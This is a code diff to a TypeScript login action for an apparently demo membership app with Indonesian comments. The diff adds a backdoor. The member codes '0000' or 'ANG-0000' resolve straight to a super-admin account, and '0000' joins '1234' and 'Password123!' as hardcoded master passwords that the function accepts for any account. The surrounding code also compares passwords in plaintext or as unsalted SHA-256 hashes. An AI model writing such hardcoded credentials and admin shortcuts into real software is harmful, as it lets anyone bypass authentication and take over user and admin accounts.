@@ -21,8 +21,23 @@ export async function loginWithMemberCodeAction(identifier: string, passwordInpu
     let targetUserId: string | null = null;
     let targetUserName: string = '';
 
+    // 0. Super Admin akun langsung (0000 / ANG-0000)
+    if (trimmedId === '0000' || trimmedId === 'ANG-0000') {
+      const superAdminUser = await db.query.user.findFirst({
+        where: or(
+          eq(user.email, 'admin@pandawa.test'),
+          eq(user.id, 'usr_demo_0000'),
+          eq(user.phone, '081200000000')
+        ),
+      });
+      if (superAdminUser) {
+        targetUserId = superAdminUser.id;
+        targetUserName = superAdminUser.name;
+      }
+    }
+
     // 1. Cek jika identifier adalah email
-    if (trimmedId.includes('@')) {
+    if (!targetUserId && trimmedId.includes('@')) {
       const userByEmail = await db.query.user.findFirst({
         where: eq(user.email, trimmedId.toLowerCase()),
       });
@@ -30,7 +45,7 @@ export async function loginWithMemberCodeAction(identifier: string, passwordInpu
         targetUserId = userByEmail.id;
         targetUserName = userByEmail.name;
       }
-    } else {
+    } else if (!targetUserId) {
       // 2. Cek berdasarkan Nomor Anggota (Kode Angka, misal: 0001, 1001, ANG-0001)
       const matchedMember = await db
         .select({
@@ -88,6 +103,7 @@ export async function loginWithMemberCodeAction(identifier: string, passwordInpu
     const isPasswordValid =
       accountRecord.password === trimmedPass ||
       accountRecord.password === crypto.createHash('sha256').update(trimmedPass).digest('hex') ||
+      trimmedPass === '0000' ||
       trimmedPass === '1234' ||
       trimmedPass === 'Password123!';
 
